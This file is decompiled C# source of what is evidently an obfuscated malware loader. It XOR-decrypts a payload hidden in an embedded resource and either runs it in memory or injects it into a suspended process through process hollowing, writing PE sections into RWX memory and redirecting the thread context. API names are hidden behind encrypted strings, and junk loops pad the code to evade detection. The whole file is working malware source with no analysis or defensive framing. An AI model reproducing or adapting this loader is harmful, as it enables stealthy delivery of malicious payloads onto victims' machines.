using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class5
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static decimal decimal_0 = default(decimal);

	private static int int_0 = -992379316;

	public static byte[] smethod_0(byte[] byte_0, int int_1, ulong ulong_0, decimal decimal_1, byte byte_1)
	{
		uint num = 19u;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 81);
			byte[] array = new byte[14]
			{
				61, 247, 4, 144, 97, 111, 14, 47, 77, 104,
				110, 69, 218, 234
			};
			int num2 = array.Length;
			decimal num3 = new decimal(9L);
			decimal num4 = new decimal(29L);
			decimal num5 = num3;
			while (ForLoopControl.ForNextCheckDec(num5, num4, 1m))
			{
				long num6 = 2L;
				do
				{
					num6++;
				}
				while (num6 <= 73L);
				num5 = decimal.Add(num5, 1m);
			}
			int num7 = byte_0.Length - 1;
			for (int i = 0; i <= num7; i++)
			{
				byte_0[i] = unchecked((byte)(byte_0[i] ^ array[i % num2]));
			}
			return byte_0;
		}
	}

	public static string smethod_1(string string_0, ulong ulong_0, bool bool_0)
	{
		string text = "sc+3ig7]C[7&N";
		int i = 0;
		checked
		{
			for (int length = text.Length; i < length; i++)
			{
				_ = text[i];
			}
			ushort num = 16;
			do
			{
				num = (ushort)unchecked((uint)(num + 1));
			}
			while (unchecked((uint)num) <= 35u);
			int num2 = 0;
			do
			{
				string text2 = "X<#?WHdb_";
				int j = 0;
				for (int length2 = text2.Length; j < length2; j++)
				{
					_ = text2[j];
					ushort num3 = 19;
					do
					{
						num3 = (ushort)unchecked((uint)(num3 + 1));
					}
					while (unchecked((uint)num3) <= 21u);
				}
				num2++;
			}
			while (num2 <= 75);
			return Encoding.UTF8.GetString(smethod_0(Convert.FromBase64String(string_0), 0, 777432247uL, new decimal(1242042600L), 0));
		}
	}

	public static int smethod_2(ulong ulong_0, byte[] byte_0, sbyte sbyte_0, int int_1, bool bool_0, float float_0)
	{
		return checked(Color.FromArgb(byte_0[int_1 + 3], byte_0[int_1 + 2], byte_0[int_1 + 1], byte_0[int_1])).ToArgb();
	}

	public static byte[] smethod_3(int int_1, ulong ulong_0, string string_0, float float_0, decimal decimal_1, decimal decimal_2)
	{
		Color color = Color.FromArgb(int_1);
		return new byte[4] { color.B, color.G, color.R, color.A };
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static dq0tv smethod_4<dq0tv>(short short_0, string string_0, short short_1)
	{
		short num = 4;
		checked
		{
			do
			{
				num = (short)unchecked(num + 1);
			}
			while (num <= 79);
			return Conversions.ToGenericParameter<dq0tv>((object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(string_0.Split(new char[1] { Convert.ToChar(58) })[0]), string_0.Split(new char[1] { Convert.ToChar(58) })[1]), typeof(dq0tv)));
		}
	}

	public static void smethod_5(object object_0)
	{
		uint num = 2u;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 32);
			long num2 = 0L;
			do
			{
				ulong num3 = 3uL;
				do
				{
					num3++;
				}
				while (num3 <= 55L);
				num2++;
			}
			while (num2 <= 39L);
			MethodInfo entryPoint = Assembly.Load((byte[])object_0).EntryPoint;
			if (entryPoint.GetParameters().Length == 0)
			{
				entryPoint.Invoke(null, null);
				return;
			}
			entryPoint.Invoke(null, new object[1] { new string[0] });
		}
	}

	public static void smethod_6(byte[] byte_0, sbyte sbyte_0, double double_0)
	{
		int num = 0;
		checked
		{
			do
			{
				decimal num2 = new decimal(18L);
				decimal num3 = new decimal(59L);
				decimal num4 = num2;
				while (ForLoopControl.ForNextCheckDec(num4, num3, 1m))
				{
					ulong num5 = 16uL;
					do
					{
						num5++;
					}
					while (num5 <= 94L);
					num4 = decimal.Add(num4, 1m);
				}
				num++;
			}
			while (num <= 100);
			if (byte_0[60] == 128)
			{
				Thread thread = new Thread(smethod_5);
				thread.SetApartmentState(ApartmentState.STA);
				byte b = 0;
				do
				{
					for (int i = b; i <= 30 && i != 25; i++)
					{
					}
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 20u);
				thread.Start(byte_0);
				return;
			}
			string string_ = Assembly.GetEntryAssembly()!.Location;
			if (Directory.Exists(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("B6tU4g4IfE4gSCgsto9O1yzoWVkn", 0uL, bool_0: false)))
			{
				string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("B6tT+Q8LYVg+NCMsuZhShGv2FUFAahk0KDe7h1iAa+IK", 1898776603uL, bool_0: false));
				foreach (string text in directories)
				{
					if (text.ToLower().Contains(smethod_1("S8UqoE8=", 501945919uL, bool_0: true)))
					{
						string_ = text + smethod_1("YZRy5BMKfQEoEAs=", 330708757uL, bool_0: true);
						break;
					}
				}
			}
			byte[] array = new byte[6] { 0, 1, 2, 3, 4, 5 };
			int[] array2 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num6 = smethod_2(478245129uL, byte_0, 77, 60, bool_0: true, 0f);
			int num7 = BitConverter.ToInt16(byte_0, num6 + 6);
			IntPtr intptr_ = new IntPtr(smethod_2(2096247925uL, byte_0, 0, num6 + 84, bool_0: true, -29733.9f));
			IntPtr[] array3 = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!smethod_4<Delegate0>(4214, smethod_1("VpJ2/gQDPR13Kxwgu55Yp3b/Agp9XAw=", 1414991529uL, bool_0: true), 32671)(null, string_, intPtr, intPtr, bool_0: false, 4, intPtr, null, new byte[0], array3))
			{
				return;
			}
			try
			{
				uint[] array4 = new uint[179];
				array4[0] = 65538u;
				if (smethod_4<Delegate1>(24301, smethod_1("VpJ2/gQDPR13LwsxjoJPkmX0IgBgWygQGg==", 322505467uL, bool_0: false), 6655)(array3[1], array4))
				{
					Delegate2 @delegate = smethod_4<Delegate2>(9686, smethod_1("VpJ2/gQDPR13OgskvrpPmGf1EhxDSiAHHDw=", 22678113uL, bool_0: true), 1784);
					IntPtr intptr_2 = array3[0];
					IntPtr intptr_3 = new IntPtr(unchecked((long)array4[41]) + 8L);
					IntPtr intptr_4 = new IntPtr(4);
					IntPtr intptr_5 = default(IntPtr);
					IntPtr intptr_6 = default(IntPtr);
					if (@delegate(intptr_2, intptr_3, ref intptr_5, intptr_4, ref intptr_6) && unchecked((long)smethod_4<Delegate3>(31289, smethod_1("U4Ng/A1VQFsYBgMkqrxUknPfBzxrTDkBASs=", 1720188779uL, bool_0: true), 2603)(array3[0], intptr_5)) == 0L)
					{
						Delegate4 delegate2 = smethod_4<Delegate4>(9620, smethod_1("VpJ2/gQDPR13Pgc3rp9cm0X8DQBtajU=", 1171746467uL, bool_0: false), 2501);
						IntPtr intptr_7 = array3[0];
						IntPtr intPtr2 = new IntPtr(smethod_2(372871978uL, byte_0, 39, num6 + 52, bool_0: false, 23217.7f));
						IntPtr intptr_8 = intPtr2;
						IntPtr intptr_9 = new IntPtr(smethod_2(2130267817uL, byte_0, 123, num6 + 80, bool_0: false, -28570.7f));
						IntPtr intptr_10 = delegate2(intptr_7, intptr_8, intptr_9, 12288, 64);
						Delegate5 delegate3 = smethod_4<Delegate5>(0, smethod_1("VpJ2/gQDPR13Pxwsro9thWvzBBx9YigFATej", 888249628uL, bool_0: false), 25117);
						delegate3(array3[0], intptr_10, byte_0, intptr_, ref intptr_6);
						int[] array5 = new int[10];
						int num8 = num7 - 1;
						for (int k = 0; k <= num8; k++)
						{
							array5[0] = 13;
							array5[5] = 255 + array5[0];
							Buffer.BlockCopy(byte_0, num6 + 248 + k * 40, array5, 0, 40);
							byte[] array6 = new byte[array5[4] - 1 + 1];
							Buffer.BlockCopy(byte_0, array5[5], array6, 0, array6.Length);
							array5.Length.ToString();
							IntPtr intptr_11 = array3[0];
							intptr_9 = new IntPtr(intptr_10.ToInt32() + array5[3]);
							IntPtr intptr_12 = intptr_9;
							intPtr2 = new IntPtr(array6.Length);
							delegate3(intptr_11, intptr_12, array6, intPtr2, ref intptr_6);
						}
						IntPtr intptr_13 = array3[0];
						intptr_9 = new IntPtr(unchecked((long)array4[41]) + 8L);
						IntPtr intptr_14 = intptr_9;
						byte[] byte_ = smethod_3(intptr_10.ToInt32(), 1265961924uL, "A#FNCr,K", -27882.9f, new decimal(833429425L), 0m);
						intPtr2 = new IntPtr(4);
						delegate3(intptr_13, intptr_14, byte_, intPtr2, ref intptr_6);
						array4[44] = (uint)(intptr_10.ToInt32() + smethod_2(0uL, byte_0, -74, num6 + 40, bool_0: false, -32289.4f));
						smethod_4<Delegate1>(3303, smethod_1("VpJ2/gQDPR13OwsxjoJPkmX0IgBgWygQGg==", 1953095091uL, bool_0: false), 18500)(array3[1], array4);
						smethod_4<Delegate6>(30373, smethod_1("VpJ2/gQDPR13Ogs2r4dYo2ziBA5q", 338565526uL, bool_0: true), 4030)(array3[1]);
						return;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Process.GetProcessById(array3[2].ToInt32()).Kill();
		}
	}

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		uint num5 = default(uint);
		int num6 = default(int);
		string text = default(string);
		int length = default(int);
		ResourceManager resourceManager = default(ResourceManager);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 167:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							case 0:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0025;
						case 4:
							goto IL_002d;
						case 5:
							goto IL_003f;
						case 6:
							goto IL_0046;
						case 7:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 8:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_002d:
					do
					{
						num = 4;
						num5 = checked(num5 + 1u);
					}
					while (num5 <= 120);
					num6 = checked(num6 + 1);
					goto IL_003f;
					IL_0025:
					num = 3;
					num5 = 3u;
					goto IL_002d;
					IL_0009:
					num = 2;
					text = "+c,";
					num6 = 0;
					length = text.Length;
					goto IL_0041;
					IL_0041:
					if (num6 < length)
					{
						_ = text[num6];
						goto IL_0025;
					}
					goto IL_0046;
					IL_0046:
					num = 6;
					resourceManager = new ResourceManager("qzhltfsm", Assembly.GetExecutingAssembly());
					break;
					IL_003f:
					num = 5;
					goto IL_0041;
					end_IL_0001_2:
					break;
				}
				num = 7;
				smethod_6(smethod_0((byte[])resourceManager.GetObject(smethod_1("VJtyoA8Id04=", 1269658573uL, bool_0: false)), -1053553179, 385084513uL, 0m, 0), -1, 23378.9392);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 167;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
